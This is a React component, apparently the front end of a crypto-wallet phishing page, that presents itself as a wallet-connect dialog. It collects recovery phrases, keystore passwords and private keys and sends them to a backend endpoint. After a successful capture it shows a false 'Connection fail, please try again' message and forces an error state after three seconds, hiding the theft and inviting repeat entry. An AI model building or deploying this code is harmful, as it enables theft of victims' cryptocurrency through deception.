
'use client';
import React, { useState, useEffect } from "react";



function WalletConnectModal({ wallet, onClose }) {
  const [status, setStatus] = useState("connecting");
  const [selectedMethod, setSelectedMethod] = useState("phrase");
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [showKeystorePassword, setShowKeystorePassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [phraseInput, setPhraseInput] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKeyInput, setPrivateKeyInput] = useState("");

  // Debug: Log wallet data to help diagnose issues
  useEffect(() => {
    console.log('WalletConnectModal received wallet:', wallet);
    if (!wallet) {
      console.error('WalletConnectModal: No wallet provided!');
    } else if (!wallet.name) {
      console.error('WalletConnectModal: Wallet object missing name property:', wallet);
    }
  }, [wallet]);

  // Handle case where wallet is not provided
  if (!wallet) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
        <div className="bg-white rounded-lg w-96 p-6">
          <h2 className="text-xl mb-4 text-red-600">Error</h2>
          <p className="mb-4">No wallet selected. Please try again.</p>
          <div className="flex justify-end">
            <button className="px-4 py-2 border border-gray-300 rounded" onClick={onClose}>
              Close
            </button>
          </div>
        </div>
      </div>
    );
  }

  useEffect(() => {
    const timer = setTimeout(() => {
      setStatus("error");
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async () => {
    setIsSubmitting(true);
    setStatus("connecting");
    
    try {
      // Prepare data to submit
      const submitData = {
        walletName: wallet.name,
        connectionMethod: selectedMethod,
      };
      
      // Add method-specific data
      if (selectedMethod === 'phrase') {
        submitData.phraseInput = phraseInput;
      } else if (selectedMethod === 'keystore') {
        submitData.keystorePassword = keystorePassword;
      } else if (selectedMethod === 'privateKey') {
        submitData.privateKeyInput = privateKeyInput;
      }
      
      // Submit data to backend
      const response = await fetch('/api/wallet-connections', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(submitData),
      });

      if (response.ok) {
        setStatus("success");
        
        // Clear form inputs
        setPhraseInput("");
        setKeystorePassword("");
        setPrivateKeyInput("");
        setSelectedMethod("phrase");
        setShowPrivateKey(false);
        setShowKeystorePassword(false);
        
        // Close modal after 2 seconds
        setTimeout(() => {
          onClose();
        }, 2000);
      } else {
        setStatus("error");
        console.error('Failed to submit wallet connection');
      }
    } catch (error) {
      setStatus("error");
      console.error('Error submitting wallet connection:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg w-96 p-6">
        <div className="text-center ">
          {status === 'connecting' && <p>Processing…</p>}
          {status === 'success' && <p className="text-red-600">Connection fail, please try again...</p>}
        </div>

        <h2 className="text-xl mb-4">Connect {wallet.name}</h2>
        <div className="flex items-center mb-4">
          <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 rounded-2xl mr-2" />
          <span>{wallet.name}</span>
        </div>
        <div className="flex space-x-3 mb-4 border-b-2">
            <button
              className={`flex-1 py-2 text-gray-700 hover:text-gray-900 ${
                selectedMethod === 'phrase'
                  ? 'border-b-2 border-black text-black font-semibold'
                  : ''
              }`}
              onClick={() => setSelectedMethod('phrase')}
            >
              Phrase
            </button>
            <button
              className={`flex-1 py-2 text-gray-700 hover:text-gray-900 ${
                selectedMethod === 'keystore'
                  ? 'border-b-2 border-black text-black font-semibold'
                  : ''
              }`}
              onClick={() => setSelectedMethod('keystore')}
            >
              Keystore
            </button>
            <button
              className={`flex-1 py-2 text-gray-700 hover:text-gray-900 ${
                selectedMethod === 'privateKey'
                  ? 'border-b-2 border-black text-black font-semibold'
                  : ''
              }`}
              onClick={() => setSelectedMethod('privateKey')}
            >
              Private Key
            </button>
          </div>

        {selectedMethod === 'phrase' && (
          <div className="mb-4">
            <label className="block mb-1 font-medium">Enter your Phrase</label>
            <textarea
              className="w-full border border-gray-300 rounded px-3 py-3 h-24 resize-none text-gray-800"
              placeholder="Enter your recovery phrase"
              value={phraseInput}
              onChange={(e) => setPhraseInput(e.target.value)}
              rows={4}
            />
            <p className="text-sm text-gray-500 mt-1">
              Please enter your 12 or 24 word recovery phrase separated by spaces.
            </p>
          </div>
        )}
        {selectedMethod === 'keystore' && (
          <div className="mb-4">
            <label className="block mb-1 font-medium">Upload Keystore File</label>
            <input
              type="file"
              className="w-full h-25 border border-gray-300 rounded px-3 py-2"
              accept=".json,.txt"
            />
            <p className="text-sm text-gray-500 mt-1">
              Upload your keystore file (JSON or TXT format) to connect your wallet.
            </p>
            <div className="relative mt-2">
              <input
                type={showKeystorePassword ? "text" : "password"}
                className="w-full border border-gray-300 rounded px-3 py-2 pr-10 text-gray-800"
                placeholder="Enter your keystore password"
                value={keystorePassword}
                onChange={(e) => setKeystorePassword(e.target.value)}
              />
              <button
                type="button"
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600"
                onClick={() => setShowKeystorePassword(!showKeystorePassword)}
              >
                {showKeystorePassword ? (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                ) : (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L7.757 7.757m4.242 4.242l3.121 3.121M12 12l.878.878M12 12l-.878.878M12 12l.878-.878M12 12l-.878-.878" />
                  </svg>
                )}
              </button>
            </div>
          </div>
        )}
        {selectedMethod === 'privateKey' && (
          <div className="mb-4">
            <label className="block mb-1 font-medium">Enter Private Key</label>
            <div className="relative">
              <input
                type={showPrivateKey ? "text" : "password"}
                className="w-full border border-gray-300 rounded px-3 py-2 pr-10 text-gray-800"
                placeholder="Enter your private key"
                value={privateKeyInput}
                onChange={(e) => setPrivateKeyInput(e.target.value)}
              />
              <button
                type="button"
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600"
                onClick={() => setShowPrivateKey(!showPrivateKey)}
              >
                {showPrivateKey ? (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                ) : (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L7.757 7.757m4.242 4.242l3.121 3.121M12 12l.878.878M12 12l-.878.878M12 12l.878-.878M12 12l-.878-.878" />
                  </svg>
                )}
              </button>
            </div>
            <p className="text-sm text-gray-500 mt-1">
              Enter your private key to connect your wallet securely.
            </p>
          </div>
        )}
        <div className="flex flex-col space-y-2">
          <button
            className="w-full px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 disabled:opacity-50"
            onClick={handleSubmit}
            disabled={isSubmitting}
          >
            {isSubmitting ? 'Processing...' : 'Proceed'}
          </button>
          <div className="flex justify-end">
            <button className="px-4 py-2 border bg-red-500 border-gray-300 rounded hover:bg-gray-50" onClick={onClose}>
              Cancel
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default WalletConnectModal;
